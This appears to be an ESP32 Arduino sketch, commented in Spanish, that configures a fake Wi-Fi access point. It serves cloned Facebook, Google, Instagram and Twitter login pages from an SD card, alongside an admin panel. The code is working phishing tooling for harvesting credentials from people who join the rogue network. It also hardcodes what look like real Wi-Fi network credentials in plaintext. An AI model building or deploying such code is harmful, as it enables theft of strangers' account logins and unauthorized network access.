#include <FS.h>
#include <SD_MMC.h>
#include <FakeAPlib.h>


//variable para el nombre del wifi
const char* SSID   = "ESP.local-server";
const char* PASS   = "SECUREhash9361";
const char* WIFI_SSID = "Finetwork_82FBD";
const char* WIFI_PSW  = "2c2D4GeA";

//const char* DATA_FILE  = "/data/data.yaml";
const char* ADMIN_PAGE = "/webpages/admin-login/admin-panel.html";
const char* AUTH_PAGE  = "/webpages/admin-login/index-login.html";
//const char* THKS_PAGE  = "/webpages/succes.html";

const char* FB_PATH = "/webpages/facebook-login";
const char* GL_PATH = "/webpages/google-login";
const char* IS_PATH = "/webpages/instagram-login";
const char* TW_PATH = "/webpages/twitter-login";

//IPAddress apip(192,168,1,1);
const IPAddress* serverip = new IPAddress(10,10,10,1);
//byte apmac[6];

FakeAP* accessPoint = new FakeAP(80);
int printed = 0;

void setup()
{
  Serial.begin(115200);
  Serial.setDebugOutput(true);
  delay(2000);

  Serial.println("Loading....");
  delay(1000);

  Serial.println("File dir test: ");
  Serial.println(SDCardManager::getFileDir(ADMIN_PAGE));
  Serial.println(SDCardManager::getFileDir(FB_PATH));
  Serial.println(SDCardManager::getFileDir(AUTH_PAGE));
  
  accessPoint->setPath(ADMIN_PAGE, ADMINPAGE);
  accessPoint->setPath(AUTH_PAGE,  INDEXPAGE);
  //accessPoint->setPath(THKS_PAGE,  EXITPAGE);
  //accessPoint->setPath(DATA_FILE,  DATAFILE);

  accessPoint->setPath(FB_PATH, FACEBOOK);
  accessPoint->setPath(GL_PATH, GOOGLE);
  accessPoint->setPath(IS_PATH, INSTAGRAM);
  accessPoint->setPath(TW_PATH, TWITTER);

  WiFi.mode(WIFI_AP);
  WiFi.hostname("ESP.server");
  WiFi.softAPConfig(*serverip, *serverip, IPAddress(255, 255, 255, 0));
  if (!accessPoint->initialize(SSID, PASS, WIFI_SSID, WIFI_PSW))
    Serial.println("Error en la configuración del punto de acceso");


  //if (!accessPoint->setWifiStation(WIFI_SSID, WIFI_PSW))
    // Serial.println("Conexión a la wifi fallada.");

  Serial.println("Config done!");
  
}

void loop()
{
  accessPoint->process();

  if (printed<=0){
    accessPoint->printFilesContent();
/*
    Serial.println("Replaced string:");
    File* file = new File(SD_MMC.open(ADMIN_PAGE));
    if (*file)
    {
      String adminContent = file->readStringUntil('\0');
      adminContent.replace(Placeholder_t::AccessPointSSID, WiFi.softAPSSID());
      adminContent.replace(Placeholder_t::ServerIP, WiFi.softAPIP().toString());
      adminContent.replace(Placeholder_t::HostsConected, String(WiFi.softAPgetStationNum()));
      if (WiFi.status() == WL_CONNECTED)
      {
          adminContent.replace(Placeholder_t::WifiSSID, WiFi.SSID());
          adminContent.replace(Placeholder_t::ClientIP, WiFi.localIP().toString());
          adminContent.replace(Placeholder_t::WifiStatus, "Conectado");
      }
      else
      {
          adminContent.replace(Placeholder_t::WifiSSID, WiFi.SSID());
          adminContent.replace(Placeholder_t::ClientIP, WiFi.localIP().toString());
          adminContent.replace(Placeholder_t::WifiStatus, "No Conectado");
      }
      Serial.println(adminContent);
    }
    */

    printed++;

    //delete file;
  }



}